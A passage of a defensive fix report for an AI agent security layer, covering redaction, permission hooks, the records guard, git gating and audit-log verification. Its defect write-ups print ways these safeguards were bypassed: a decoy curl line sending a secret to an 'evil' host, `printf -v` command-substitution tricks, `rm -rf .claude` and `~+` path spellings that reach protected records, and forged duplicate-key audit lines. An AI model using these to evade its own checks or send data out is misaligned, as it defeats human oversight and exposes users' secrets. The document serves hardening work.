  is refused with F504 before anything runs, recorded with `covered_by`,
  when: the name is registered as another tool than the one listed, or as
  two; the listed tool is plain and the name is not registered (its checks
  are its listed binding's); or a destination policy is in force (the
  layer's, or the composite's and enclosing composites' profiles') and the
  name is not registered, whatever the listed tool, since the tool that runs
  under an unregistered name may be one that sends anywhere (§4.4.2,
  §5.18.10's "a call of an unbound tool, which may send anywhere"). With no
  policy in force, a name listed for a grounded tool needs no registration:
  the tool that runs checks itself if it is grounded, and a plain tool that
  runs is a plain tool's call, which the statement does not cover (stated as
  a host gap). Not taken: running the listed object's `execute` directly
  (it would bypass the runtime's argument parsing, `uses` and hooks), and a
  witness on the listed object (it would detect a mismatch only after the
  other tool had run).
- Tests: `refuses a nested plain call when no tool is registered under its
  name` (the reported probe), `... when the tool registered under its name
  is not the one listed`, `refuses a name registered with two different
  tools`, `refuses an invocation of a name listed for a grounded tool when
  another tool is registered under it` (the sibling, registered), `refuses,
  under a destination policy, an invocation of a name listed for a grounded
  tool that no tool is registered under` (the sibling as reported; it runs
  once registered as the listed tool, and with no policy), the control
  `runs the nested call where the registered tool is the one listed`, and
  `validates what registerTools is given`.
- Tests changed to the new behaviour: the relay tests of round 1 #27
  register `notify`; `test/layer.test.ts`'s composite-profiles test
  registers its tools (its profiles put a policy in force); the call
  fixtures' runner registers each tool it builds under the name the memory
  thread runs it under, as a deployment does.

#### Documentation

The binding's statement (`covers`: nested calls through `invokeTool` to a
plain tool registered as the one listed; `does_not_cover`: a plain tool the
runtime runs under a name listed for a grounded tool; a new host gap on
`registerTools`), SECURITY.md's binding paragraph, the Standard Agents
guide (composites: the list on both routes, plain tools' checks, the tool
the runtime runs, queued calls; the guarantees row; the conformance
paragraph, with its stale fixture counts corrected to 35 and 32), the
binding README (the F504 and R402 rows, `registerTools`), the doc comments
of `grounded.ts` and `layer.ts`, and CHANGELOG [Unreleased] Upgrading (the
binding's composites and plain tools). The Standard's text was not
changed: §5.18.4 already says every other check applies to a nested call,
that the binding run under a listed name need not be the one listed, and
that a call made through the composite once its call has ended is checked
as a call of its own or refused; §5.18.10 already requires the persist,
audit and output rows of every covered call and refusal under a policy of
a call that may send anywhere. No version changes.

#### Checks after batch 5

- TypeScript: the binding's check and test (233 passed, 2 skipped; 217
  before the batch, plus the 16 new tests); `packages/acs-core` build (no
  source changed; the WebAssembly build reused), check and test (2002).
- Python: `pytest tests/` (5967 passed, 18 skipped; no Python source
  changed); every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the generators' `--check`
  (the call fixtures unchanged); `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- Site: `npm run check`, `npm test` (1173). The Standard did not change and
  the Standard Agents guide is not in the figure-gap sweep's enforced scope.
- Old code: the three test files run with fb50354's `grounded.ts` (above):
  14 failed, the controls passed.
- Probes, each under `timeout 120` with the heap bounded (a 4 GB
  address-space limit stops vitest's workers, which reserve more), inputs
  of at most 1 MB: the reporters' five (`p1_plain_persist`,
  `p2_queue_tool`, `p3_plain_output`, `p3b_plain_confidence`,
  `p5_plain_name`) and the verifiers' five (`v18`, `q_queue`,
  `v3_contract_grounding`, `p5b_siblings`, `p5c_pointer`), pointed at this
  worktree, twice: as written (no `registerTools`), and with a memory thread
  that registers each tool the runtime runs under its name, as a faithful
  deployment does. In both runs no secret was stored, nothing was sent to a
  host the policy does not allow or queued past the composite, no
  checkpoint that saved nothing let a rollback run (F503 after it), and the
  low-confidence and contract-breaking nested outputs were refused (F504,
  R402); the registered run reached each specific check (F504 secret, R402,
  F504 confidence, the mismatch refused, an allowed send run), the
  unregistered run refused the plain calls for want of registration and
  the verifiers' sibling A under its policy. Timing: a nested plain persist
  and retrieve with 1 MB of data and output, 63 ms. No CLI or nested agent
  was started; nothing was left running; the probe directory's
  `node_modules` link and vite cache were removed.

### Batch 6: four reported defects

Four defects, each reproduced by an independent verifier on bfb18b1: the
binding's record of one refusal, the core's diagnostics and the runner's
redaction of a host's anchors, the plugin hook's persist row, and the audit
log verifier. None was fixed by an earlier batch: git log, round 1 (#43
covered a tool's `secrets` function as a source of redaction values, not
its failure; #34 and #36 redacted the runner's own `Error`s, not the core's
diagnostics or an `Output`; #39 anchored the log's end, not its lines' bytes)
and round 2 batches 1 to 5 checked, and each reported route reproduced on
102d310 before its fix. Each fix has tests that fail on the code before it
(below, per defect, with the controls that pass on both).

#### 22. A grounded call refused because its secrets function failed (R407) was not recorded (low)

`execute` read the tool's `secrets` (`secretsOf`) before `check` and, when
the function threw, returned the R407 refusal straight away: no trace entry,
no `recorded_by`, so the audit hook wrote its own entry for the call
(`capability: null`, `failed`, no code). §5.18.8 records each call a layer
refuses. Fail-closed held: the tool's code never ran.

- Fix (`examples/standard_agents/src/acs/grounded.ts`): that path appends a
  `refused` entry with code R407, the call's identity (tool, capability,
  domain, position, `person_required`; now `identityOf`, shared with
  `check`), the arguments' digest when they have one, and `recorded_by`,
  under `serially`, redacted with the secrets the layer holds
  (`layerSecrets()`: the layer's and those tools registered, plus the
  default patterns). A record the store refuses leaves the call refused
  (`.catch`), as `check`'s own R407 path does. `refused`, not `failed`: the
  call never started, as the R407 for changed layer profiles is recorded.
- Tests (`test/evidence.test.ts`): `refuses and records a retrieve|mutate
  call whose secrets function fails (R407, §5.18.8)`: one `refused` R407
  entry with `recorded_by` (name, version, config digest) and the args
  digest, the layer's secret in the thrown message redacted, the tool's code
  not run, and the audit hook linking that entry (`tool_call_id`) instead of
  writing one. Both fail on 102d310's `grounded.ts` (no entry).
- Sibling: the Python adapter's secrets are values (`secret_values`), never
  a function that can fail; `controlTool` and `memoryTools` read no secrets
  function. None to fix.

#### 23. The core's F505 diagnostic copied an anchor's ref (a presigned or signed URL) into the trace, result, run record and snapshot (medium)

`grounding::check` built its F505 messages with the anchor's `ref`
(`evidence_anchors[0] cites 'https://...&X-Amz-Signature=...'`), and the
executor put the message in `step_failed`/`run_failed`, `RunResult.message`,
the run record and the snapshot; nothing redacts the core's own diagnostic,
and the runner submitted an `Output` unredacted, so a registered secret
leaked too. The other `acs:` messages did the same; the TypeScript port
(`packages/acs-core/src/evidence.ts`, which the binding's grounding check
uses) said the same.

- Fix, core (`core/src/grounding.rs`): every message names the anchor by
  its index and kind (`evidence_anchors[0] (kind 'url') cites a ref the
  host's evidence_seen does not list`; an `acs:` anchor "whose rest is not a
  reference body", "cites a workflow value that no reference bound ...
  covers"), as the destination refusal (`exec/machine.rs`) leaves the
  destination out. A kind is named only when it is one of §6.5's; a vendor
  kind is "a vendor (x-) kind", anything else "a kind outside §6.5's
  vocabulary", since a kind is host text too.
- Siblings, core: the same rule for every value of a host's output a
  diagnostic repeated. `inference_method` outside the vocabulary is no
  longer quoted; a confidence that is not a number from 0 to 1 is named by
  `grounding::shown_value` (a number, a boolean or null as it is, anything
  else by its type: `(a string)`), in the grounding message, the contract
  check (`contract_value_problem`, R402: it showed 64 characters of the
  value) and the minimum-confidence fault (`ConfidenceFault::Invalid`, F504
  `invalid_confidence`: the same 64 characters). Checked and left: the
  memory-scope mismatch names the scope the step bound and the one returned
  (scopes are names, §4.5), and the delegation identity errors name no
  value of the output beyond its member names.
- Fix, TypeScript: `checkGrounding` and the binding's `confidenceFailure`
  say what the core says; `@synaptiai/acs-core` exports `shownValue`.
- Fix, runner (`grounded_agency/workflows/runner.py`,
  `_redact_anchors`): every `Output` is submitted with each evidence anchor
  that holds a secret redacted by the runner's `redactor`
  (`redact_anchor_data`, registered secrets included: the ref, excerpt and
  metadata replaced, the digest dropped with `digest_omitted: secret`), so
  the run's state, outputs, trace and snapshots never hold it, an accepted
  output's included. `evidence_seen` is rewritten to match: each anchor's
  redacted ref is listed when its own ref was; when two anchors are one
  after redaction (two signed URLs differing in the signature) it is listed
  only when both were, so an anchor the host did not list never passes as
  seen (fail closed; with `evidence_seen` given, an unlisted anchor fails
  F505 either way, so no outcome changes). A `seen` that is not a list of
  strings is left for the core to refuse. Not taken: redacting the core's
  message after the fact (the trace and snapshot are the core's, and the
  message would still be built from the raw ref).
- Tests: Rust `grounding::tests::messages_never_repeat_what_an_anchor_cites`
  (three credential-bearing refs under three kinds, four `acs:` forms, a
  string confidence and method), `messages_say_why` changed to the new
  wording (it asserted the quoted method and confidence), and
  `profile::tests::confidence_checks` changed likewise (it asserted the
  64-character cut; it now asserts each type's name and that the message
  holds no key): the three fail on 102d310's `grounding.rs` and
  `profile.rs`. TypeScript `grounding messages repeat nothing an anchor
  cites (§6.7)` (5 tests; all fail on 102d310's `evidence.ts`, with a stub
  for the new export), and the binding's `applies the minimum confidence as
  the core does` (the message names the type). Python
  (`tests/test_runner_evidence.py`): `test_no_secret_from_an_anchor_in_a_step_refused_with_f505`
  (the reported probe: S3 presigned, Azure SAS and userinfo refs, with the
  default redactor and with the secret registered: trace, message, outputs,
  action records, run record and snapshot hold neither the signature nor
  the key id; 102d310's core leaks with the default redactor),
  `test_an_accepted_anchor_is_kept_redacted_and_still_attested` (the host
  lists the anchor: the attested policy passes and the outputs hold the
  redacted anchor without its digest; fails on 102d310's runner), and the
  control `test_anchors_one_after_redaction_are_attested_only_when_both_were`.
- Not changed: the default patterns do not recognise a signed URL's
  signature (`sig=`, `X-Amz-Signature=`, `X-Goog-Signature=`); a
  `X-Amz-Credential` key id, a URL's userinfo password and `api_key=` are.
  How a host recognises secrets is its choice (§6.7); the F505 path no
  longer depends on it, and the guide says how to add a pattern. Widening
  the defaults would change the Python, TypeScript and shell redactors and
  the shared vectors together, a change of its own.

#### 24. The plugin's pre-tool-use hook let TodoWrite, TaskCreate and TaskUpdate (persist) store a credential (medium)

The three are on `UNGATED_TOOLS` (persist needs neither a checkpoint nor
approval), and the hook exited 0 for them before any check: §5.18.10's
persist row (no secret the layer recognises, F504, decided by code) was
never applied, although the plugin holds the scan and the SDK adapter
refuses the same calls.

- Fix (`hooks/pretooluse_require_checkpoint.sh`): `PERSIST_TOOLS=(TodoWrite
  TaskCreate TaskUpdate)`; before the ungated exit, a call of one is blocked
  with `F504 CONSTRAINT_VIOLATED: <tool> (persist): ...`, in every
  permission mode, when its input holds a secret as the adapter decides it
  (`Redactor.holds_credential`): the shared scan (`secret_scan.sh`, copied
  between its BEGIN and END lines) over every string of `tool_input` and
  over its JSON text, and the SDK redactor's rule for data
  (`SECRET_MEMBER_JQ`, a jq port of `_secret_member_value`: a value of 4 or
  more characters other than `[REDACTED]`, or a number, that is not a
  placeholder, under a member whose name ends in a credential's or names
  `Authorization`/`Cookie`, as the value of such a name/value pair, or the
  second of such a `[name, value]` tuple). Input jq cannot read is R407.
  The scan runs with pipefail off: a `grep -q` that stops at a match ends
  the `printf` feeding it, which pipefail would read as no match. jq folds
  case by Unicode where the SDK folds ASCII only, so the hook finds a
  credential name in rare spellings the SDK does not, never the reverse.
- Tests (`tests/test_pretooluse_hooks.py`, `TestShellHookPersistSecrets`):
  the reported payload for each tool in `default` and `bypassPermissions`
  (F504, nothing written); the hook's verdict equal to the adapter's on 20
  inputs (text and data forms, placeholders, prose, the marker) and on the
  55 credential vectors that register no value (each also equal to the
  vector's `holds`); 1 MB of todos before an AWS key refused in under 5 s
  (0.17 s measured; 0.37 s for 1 MB with no secret, 0.07 s for 100 KB).
  `test_the_pre_tool_use_hook_copies_the_secret_scan`
  (`tests/test_skill_hooks.py`) keeps the copy equal to the file, and
  `test_persist_tools_are_the_ungated_tools_the_mapper_says_store`
  (`tests/test_hook_lists_match_mapper.py`) keeps the list the mapper's.
  On 102d310's hook, 21 of the 30 fail; the 9 that pass are the inputs both
  layers allow (controls).
- Siblings checked: no other tool on `UNGATED_TOOLS` maps to `persist` or
  `audit` (the list test says so); the persist skill's hook covers file
  writes, the audit skill's its records file.

#### 25. The audit log verifier checked a line's parsed content, not its bytes (low)

`verify_entry` took the HMAC over `json.dumps(json.loads(line) minus
hmac)`. JSON that names a member twice parses to the last value at the
first name's place, so without the key a line could be edited
(`"status":"executed","status":"failed","tool":"Read","tool":"Bash"`) to
read as an executed Read to grep or a reader that keeps the first, and
still verify; a forged earlier `hmac` member, a forged `details` before the
real one, blanks and `\u` escapes passed too.

- Fix (`tools/verify_audit_log.py`): `verify_log` checks each line with the
  new `verify_line`, as the bytes the hook signed: parsed with a
  duplicate-refusing `object_pairs_hook` (at any depth); the line must end
  with `,"hmac":"<64 hex>"}` (jq -c appends it last, in every generation:
  git history checked), must equal the compact re-serialisation of what it
  parses to (so no blank, escape or number form differs), and the HMAC is
  taken over the line with that suffix replaced by `}`. A line refused for
  a duplicate still hands the chain the hmac it ends with, so only that
  line is reported. Lines are no longer stripped: blanks around a line
  fail, and a blank line is reported (the hook writes none) and counted, as
  the hook's head counts lines. `verify_entry` still checks a parsed entry
  (the audit skill's tests use it) and says it cannot see bytes.
- Tests (`tests/test_verify_audit_log.py`, `TestTheBytesSigned`, on lines
  the hook writes with `AUDIT_HMAC_KEY` set): the reported edit, a forged
  leading `hmac`, forged `details` before the real ones, a member named
  twice inside `details`, a blank and two `\u` escapes inserted, the `hmac`
  moved first, a blank before the first line, and a blank line between two
  entries: all 10 fail on 102d310's verifier. The 182 existing verifier,
  hook and pipeline tests pass unchanged (every line the hook writes
  verifies).
- Sibling: the log hook reads its last line's `hmac` with jq (last wins);
  with hmac last and duplicates refused by the verifier, that is the value
  the verifier continues the chain from, so the two agree. The audit
  skill's chain is verified by the same `verify_log` (`--no-head`).

#### Documentation

SECURITY.md (§1.5: the runner's anchor redaction and the core's
diagnostics; the plugin hook's persist row; the log's byte-level check),
hooks/README.md (the persist row, the shared scan's third copy, the
verifier), the running-workflows guide (the runner's `redactor`, the F505
message, the signature patterns), the Standard Agents guide (the R407
record), the acs-core README (`shownValue`), the hook's header, and
CHANGELOG [Unreleased] Upgrading (the runner, the core's diagnostics, the
plugin hook and verifier, the binding's record). The Standard's text was
not changed: §6.7 already forbids a secret in a diagnostic, a trace and a
record, §5.18.8 already records each refusal, and §5.18.10 already requires
the persist row of every layer. No version changes.

#### Checks after batch 6

- Python: `pytest tests/` (6017 passed, 18 skipped; 5967 before the
  batch), and again the five test files changed after the last doc edits
  (1401 passed); ruff check and format with CI's lists; mypy; every
  `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py --strict` and
  every domain catalog and example `--strict`; `sync_skill_schemas.py
  --check` and the generators' `--check` (no fixture or vector changed: the
  vectors do not compare messages); `scripts/run_conformance.py`.
- Rust: `cargo fmt --check`, `cargo clippy --all-targets` with no
  features, `python` (against the worktree's interpreter) and `wasm`, all
  `-D warnings`; `cargo test` (all binaries pass; 258 unit tests) and
  `cargo test --features wasm --test wasm` (13). The extension was rebuilt
  (`uv pip install -e`) and the WebAssembly core rebuilt into
  `packages/acs-core/dist/` once, after the Rust change; no other copy was
  built.
- TypeScript: `packages/acs-core` build, check and test (2007; 2002 plus
  the 5 new); the binding's check and test (235 passed, 2 skipped; 233 plus
  the 2 new).
- Site: `npm run check`, `npm test` (1173).
- Old code: each fix's tests run against 102d310's file (above, per
  defect): the binding's 2, the Rust 3, the TypeScript 5, the runner's
  accepted-anchor 3 and F505 cases, the hook's 21 of 30 and the verifier's
  10 fail; the rest are controls.
- Probes, each under `timeout 120` and a 4 GB address-space limit, inputs
  of at most 1 MB: the reporter's F505 probes (`p2/f505.py`,
  `p2/f505_registered.py`) pointed at this worktree (F505 still, and the
  trace, message, run record, snapshot and store hold neither the key id
  nor the signature, registered or not; the attested run passes); the
  hook repro for the three tools (exit 2, F504) and the clean todo (exit
  0); a 16-input comparison of the hook and the adapter (all equal); the
  hook's timing at 100 KB and 1 MB (0.04 to 0.37 s). No CLI or nested
  agent was started; nothing was left running; the probe copies and the
  scratch project were removed.

## Round 3

### Batch 1: five reported defects

Five defects, each reproduced by an independent verifier on 6004f78: one in
the SDK classifier's reading of a line of read-only commands, two in what
the records guard reads (the paths the shell reads differently from their
text, and every argument of a tool other than Bash, Skill and the file
tools), one in what git reads let the repository run, and one in the audit
log's end. None was fixed by an earlier batch (git log and rounds 1 and 2
checked; round 2's fixes hold: their tests pass unchanged, and round 2 #4's
link resolution is the base the new reading extends). Each fix has tests
that fail on the code before it: the 184 tests of the three new files and
the new `TestAnchor` were run with 6004f78's three hooks, mapper, recorder
and verifier put back, and 145 failed; the 39 that passed are the
fixtures' own checks (bash runs code through `printf -v`; a delivered
config and a `post-index-change` hook run their programs), the controls
(other paths asked, `printf` without an option, a plain repository, the
user's own configuration, git's own fsmonitor, `~/` and the Monitor and
PowerShell commands the old guard read already) and two timing bounds.

#### 1. The records guard read `~+`, `~-`, `~user` and a path attached to a short option as written (low); sibling: the command a quoted word holds

`path_words` rewrote only a word opening with `~/`, and a path glued to a
short option (`-tnotes/k`, `-onotes/todo.md`) stayed one word resolved as
`<cwd>/-tnotes/k`. `cp -r fixtures/key fixtures/commits ~+/notes/k/` (with
the shipped link `notes/k -> ../.git/acs/checkpoints`) was only asked,
and, once approved, replaced the key and entered a forged commit: every
later restore of the repository's commit M ran with no checkpoint and no
approval. Sibling, not reported and not in SECURITY.md's "not seen" list:
`sh -c 'cp -r fixtures/key fixtures/commits notes/k/'` was read as one
word, `cp -r ... notes/k/`, resolved as a single path.

- Fix (`word_candidates`): each word is resolved as written and, for a
  word opening with `~`, as the shell expands it (`~`, `~/`: `$HOME`; `~+`:
  the call's directory; `~name`: that user's home, by the shell's own
  lookup on a name of `[A-Za-z0-9._-]` only); `~-`, `~N`, `~+N`, `~-N`
  (the shell's previous directory, its directory stack, which the hook
  cannot know) and a `~` followed by a name no user can have are refused
  (F504). A word opening with a single `-` is also resolved from each
  place a short option's value may start (the second character up to the
  first that is not a letter or digit, which covers `-rtdir`). Both
  readings are checked, so a quoted `'~+'` (which the shell leaves as
  written) is not missed either way.
- Fix (`add_words`): a word that holds a blank, a quote, a backslash or an
  operator once dequoted (the text a shell reads again: `sh -c`, `ssh`,
  `git -c alias.x='!...'`, `find -exec sh -c`) is read again with
  `path_words`, and a word that still holds one at that level is split at
  every blank, quote and operator.
- Bounds: every resolution counts its path's bytes against a budget of
  262144 per call (`RESOLVE_LEFT`, beside the 200-link budget), so a
  4000-letter option cluster is refused in 0.4 s, not resolved 4000 times;
  a word with no slash that is no link resolves to itself without the
  function (most words); the resolved paths are kept in an array (appending
  to one string copied it whole each time, which made a 150 KB input take
  15 s).
- Tests: `TestShellExpandedPaths` in `tests/test_records_guard.py` (the
  reported spellings, `~/` with `HOME`, `~user` by the path from that
  user's home, which fails when read as written; `~-`, `~1`, `~+2`
  refused; six nested commands; seven controls asked; the verifier's chain
  ends at the refused copy; a 4000-letter cluster in bounded time).

#### 2. The records guard never read an MCP tool's arguments (medium)

`call_text` came only from Bash, Monitor and PowerShell `.command`, a file
tool's path and Skill `.args`; every other tool gave null, so
`mcp__filesystem__write_file {"path": ".git/acs/checkpoints/key"}` and a
filesystem server's path through a shipped link were only asked.

- Fix (`RECORD_TEXTS_JQ`): the texts read are a file tool's path (read
  whole), a Bash command and a Skill call's arguments (read as words), and,
  for every other tool but Agent and Task, every string and every member
  name of the input, read whole and as words, since the hook cannot know
  which the tool takes for a path or a command. Agent and Task are not
  read: a subagent's own calls come to the hook, and reading prompts would
  refuse prose. The records regex and the lexical reading apply to every
  text; texts of at most 4096 bytes are resolved (a longer one cannot be a
  path that opens, and is a command not read, as a Bash command over 4096
  bytes is). More than 65536 bytes of such texts in one call is refused
  (F504): reading strings that each hold quoted words costs about 0.2 s per
  4 KB here, and 64 KB of them took 3.0 s, within the hook's 30 s limit on
  a slower machine.
- Not changed: a text over 4096 bytes is still not read for paths (a Bash
  command or a shell server's command padded past it), as SECURITY.md
  states; it is a `mutate` a person approves.
- Tests: `TestEveryToolsArguments` (eleven inputs refused: literal records
  in three filesystem calls, paths through links, `~+`, a shell server's
  command and argv, a member name, Monitor, PowerShell; four asked; the
  65536-byte refusal within 10 s; the slowest reading under the budget
  within 25 s; a 5 KB string not read).

#### 3. git reads and `git stash create` ran programs the repository's own configuration names (medium); siblings: hooks, a recorded restore, the clean-tree checks

`git_read_gated` checked only a promisor, a partial clone and submodules,
and `git_dir_is_made` trusts any `*/.git` by name. A project delivered with
its `.git` (an archive, a copied checkout), or one approved `git config
core.fsmonitor ./x`, makes `git status`, `git diff`, `git log -p`, `git
show`, `git ls-files` and `git stash create` run the repository's program
as `observe` or `checkpoint`, with no checkpoint and no approval, in the
plugin hook and the SDK mapper alike. Siblings: a `post-index-change` hook
in the delivered `.git/hooks` runs on `git status` (verified: it ran once);
a recorded restore (`git stash apply <id>`, allowed with nothing) runs the
smudge filters and merge drivers; the take hook's and the SDK recorder's
clean-tree check (`git diff --quiet HEAD`) ran the clean filter (verified
with a sentinel).

- Fix (hook `git_runs_configured`, mapper `git_config_may_run`, the same
  pattern `GIT_PROGRAM_KEYS` / `_PROGRAM_CONFIG`): `git config
  --show-scope --get-regexp` of `core.fsmonitor` (unless a boolean),
  `core.pager`, `pager.*`, `diff.external`, `diff.*.textconv|command`,
  `filter.*.clean|smudge|process`, `merge.*.driver`, `gpg.program`,
  `gpg.*.program`, in the local or worktree scope (an included file is
  reported with the scope of the file that includes it, checked), or a
  `post-index-change` in the hooks directory `git rev-parse --git-path
  hooks` names; a lookup git cannot answer is a yes, no repository a no.
  The user's own configuration (global, system, command line) is not
  repository content and gates nothing, so a global git-lfs filter changes
  nothing.
- Where it answers yes: a git read is gated (hook: `mutate`; mapper: the
  worst case), a recorded restore is a gated `mutate` in both, and `git
  stash create` is, in the hook, put to a person with no marker asked for
  (`checkpoint-ask`: only that command makes a marker, so requiring one
  would leave such a repository with no checkpoint ever; F502 in a mode
  that asks no one), and in the mapper `checkpoint` with the worst case
  beside it (`checkpoint`, `execute`, `send`: a host takes the first
  checkpoint with `create_checkpoint`, and a destination policy refuses
  it, since the program may send anywhere).
- Fix (clean-tree checks): the take hook and `_tree_is_head` turn each
  filter the local or worktree configuration names off (`-c
  filter.<name>.clean=` and the like: an empty command is no filter,
  verified); a name holding `=` or a listing git cannot give writes no
  marker.
- Why not the reporter's per-key value checks for every key: a pager runs
  only on a terminal and the signature program only with
  `log.showSignature`, but the hook cannot tell how the command it allows
  will run; naming the key is enough to gate.
- Tests: `tests/test_git_config_programs.py` (the fixture's programs run
  under plain git; 7 configurations × 8 reads refused F501 in the hook with
  no program run, and the worst case in the mapper; `git stash create`
  F502 in bypassPermissions and asked in default with no marker used; a
  recorded restore F501; an included file and a `post-index-change` hook
  count; git's own fsmonitor values and the user's global configuration
  gate nothing; the mapper's classes for create and restore, its lookup
  answering as the hook does, and a failed lookup a yes; the take hook and
  the recorder run no filter and still write a clean marker, and none over
  a changed tree).

#### 4. `rm -rf .claude` removed the audit log with its head, and the next line began a log that verifies (low)

The records patterns matched `audit.head` and `.claude/checkpoints` but not
their directory, and the log hook took no log and no head for a new log.

- Fix (guard): a path that resolves to the project's `.claude` or to its
  git directory's `acs/` (compared as resolved, in any letter case) is
  refused (F504): `rm -rf .claude`, `mv .claude x`, `rm -rf lnk/` (a link
  to `.claude`), `cp -r x/. .claude/`, `sh -c 'rm -rf .claude'`, `rm -rf
  ~+/.claude`, and an MCP move of `.claude`. Another `.claude` (`~/.claude`,
  `other/.claude`) and a path under it are not.
- Fix (anchor): the log hook keeps the same head in the project's git
  directory, `<git dir>/acs/audit.head` (only in a git directory git made
  for a work tree, the directory created with mode 700 and not through a
  link: a link there, or a directory it cannot make, is reported at each
  call, exit 1), and checks the log against both before it appends: a log removed
  with its head (`git clean -fdx`, which names nothing, removes `.claude`
  whole) is a cut, reported (exit 1), with neither head moved, at every
  later call. `tools/verify_audit_log.py` checks the anchor where it exists
  (`--anchor-file`, by default `<git dir>/acs/audit.head` for a log in
  `<project>/.claude/`, a `.git` file's `gitdir:` followed); after such a
  removal the default run fails on "Head not found" and on the anchor.
- Not changed: outside a git repository there is no anchor, and a command
  that removes both `.claude` and the git directory's `acs/` without naming
  them (a pattern) removes all three; SECURITY.md §5.5 says so.
- Tests: `TestTheDirectoryThatHoldsThem` (eight commands and an MCP call
  refused, three paths asked) and `TestAnchor` in
  `tests/test_verify_audit_log.py` (the anchor equals the head; `rm -rf
  .claude` and `git clean -fdx` each leave a log the hook and the verifier,
  by default and with `--head-file`, report, at every later call; moving
  all three aside starts a log that verifies; an anchor behind the log
  still anchors it; a link at `acs/` is written through by nothing and
  reported; no anchor without a git directory).

#### 5. `printf -v` (an allow-listed builtin) set shell variables, so a line of read-only commands ran code as `observe` (high)

The mapper classifies each simple command of a line on its own, and
`printf` was read-only whatever its arguments. `printf -v y
'a[\044(echo PWNED > f)]' && printf -v 'z[y]' 1` ran its command
substitution through arithmetic subscript evaluation (a `%s` with `$` does
the same, so blocking octal escapes alone would not close it); `printf -v
PATH . ; ls` ran a shipped `./ls`; `printf -v HOME . && git status` made
git read the repository's `.gitconfig` and run its fsmonitor. The adapter
allowed all three with no checkpoint, no person and no destination check.

- Fix (mapper `_writes`): `printf` writes when its first argument starts
  with `-` (`-v NAME`, `-vNAME`, `--`), and `printf` joins
  `_ARGUMENT_WRITERS`, so a word bash expands (which may become `-v...`)
  makes it write. The line takes the worst case (`mutate`, `send`).
- Fix (hook `writes`, kept a subset of the mapper's rules): the same, so
  the two agree; the hook read only lines of one command already, where a
  lone `printf -v` is harmless, but a test keeps the rules alike.
- Tests: `tests/test_shell_state.py` (bash runs each reported line's code;
  15 lines and single commands take the worst case in the mapper, three
  forms without an option still observe; `_writes` itself; the adapter's
  F501 without a checkpoint, the ask with one, and F504 under a destination
  policy; the hook's F501 and ask for six forms, and its pass for three).

#### Siblings checked

- Round 1 and 2 fixes hold: the quoted and abbreviated git options, the
  bounded word splitter (a 4096-byte line still splits in bounded time), the
  read-only allowlist's exclusions, round 2 #4's link resolution (its
  tests pass unchanged), the shipped `.claude` git directory and embedded
  git directories (their tests pass unchanged).
- Other read-only builtins: `echo`, `pwd` and the rest of the list set no
  shell state; `read`, `declare`, `let`, `test -v`, `[[ ]]`, `getopts`,
  `mapfile`, `unset` are on no list.
- The TypeScript package and the binding classify no shell command and run
  no git. The rollback skill's hook still allows a restore of a recorded
  commit (its check is unchanged); the pre-tool-use hook now gates that
  restore where the repository names a program git runs.
- The log hook's git lookup for the anchor runs with `core.fsmonitor` and
  hooks off and no fetch, as `hgit` does.

#### Documentation

SECURITY.md §5.1 (the Bash read-only rule and `printf`; git reads and
restores where the repository's own configuration or hooks name a program,
`git stash create` put to a person; the records guard's texts, expansions,
nested commands, the directory that holds the records and the 65536-byte
bound; the audit head's anchor), the §5.4 table row and §5.5 (the records
gap, the anchor's limit; the adapter's classifier), `hooks/README.md` (the
same, and the verifier's `--anchor-file`), the three hooks' header
comments, the mapper's docstrings, `docs/integrations/claude_agent_sdk.md`
(the Bash table: `git stash create` and git reads where the repository
names a program, `printf` with an option), and CHANGELOG [Unreleased]
Upgrading (the SDK's Bash entry; the plugin's records, git and audit log
entries). No version changes.

#### Checks after batch 1

- Python: `pytest tests/` (6200 passed, 18 skipped), and again the log
  hook's and the skill hooks' test files after the last hook edit (255 and
  1099 passed); ruff check and format with CI's lists; mypy; every
  `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py --strict` and
  every domain catalog and example `--strict`; `sync_skill_schemas.py
  --check` and the generators' `--check` (no fixture or vector changed);
  `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun and no core
  was rebuilt.
- TypeScript: `packages/acs-core` build, check and test (2007; the
  WebAssembly build reused); the binding's check and test (235 passed, 2
  skipped). No TypeScript source changed: neither classifies shell
  commands nor runs git.
- Site: `npm run check`, `npm test` (1173). The run sweep was not run: of
  the enforced pages only `/guides/claude-agent-sdk/` changed, and only by
  rows of its Bash table (a figure).
- Old code: the 184 new tests run with 6004f78's three hooks, mapper,
  recorder and verifier put back: 145 failed (above, per defect).
- Probes, each under `timeout 120` and a 4 GB address-space limit, inputs of
  at most 1.2 MB: every reported spelling against the final hook (F504;
  the controls asked); the MCP calls of #2 (F504); the hook's time on a
  4000-letter option cluster (0.38 s, refused), 15 strings of 4 KB of
  quoted words (3.0 s, asked), about 60 KB of slashed words (2.4 s), inputs of
  174 KB and 1.2 MB of short strings (refused in 0.47 and 0.75 s) and one
  1 MB string (0.22 s, not read for paths). No CLI or nested agent was
  started; nothing was left running; the scratch repositories and inputs
  were removed.

### Batch 2: five reported defects

Five defects, each reproduced by an independent verifier on 6004f78 and
reproduced again here on 3ecf6aa (batch 1's commit) before any change: four
in the SDK's Bash classifier and one in the persist skill's command hook.
None was fixed by an earlier batch (git log and rounds 1 to 3 checked; batch
1's tests pass unchanged but for three expectations made stricter, below).
Each fix has tests that fail on the code before it: the 119 tests of
`tests/test_bash_program_words.py` run with 3ecf6aa's mapper put back (a
stand-in `git_change_may_run` added so the module imports) gave 82
failures, and the new persist tests with 3ecf6aa's `skills/persist/SKILL.md`
gave 14; what passed is the fixtures' own checks (GNU sed's `e` runs a
command, `docker rm` asks the daemon `DOCKER_HOST` names, `git reset`
fetches in a partial clone, the hooks a change runs, bash runs two commands
in GBK and BIG5, `pip show *` writes the log a file name names), the
controls and the plugin hook's agreement.

#### 1. Text in an argument narrowed the class: a decoy dropped `send`, so a destination policy was skipped (high)

`_classify_single_command` matched its patterns against the words joined by
blanks, quoted arguments included, and the first match set the class.
`_DESTRUCTIVE_PATTERNS` was anchored only in its first alternative, so
`curl -s https://evil/c?k=SECRET -A 'git reset'`, `wget ... --header 'X:
sed -i'`, `bash -c 'curl ...' x 'git clean'` and `node exfil.js 'docker rm'`
were `mutate` alone: with approvals off and a destination policy in force
they ran (the adapter checks a Bash call against the policy only when its
class holds `send`), and with approvals on they were put to a person as
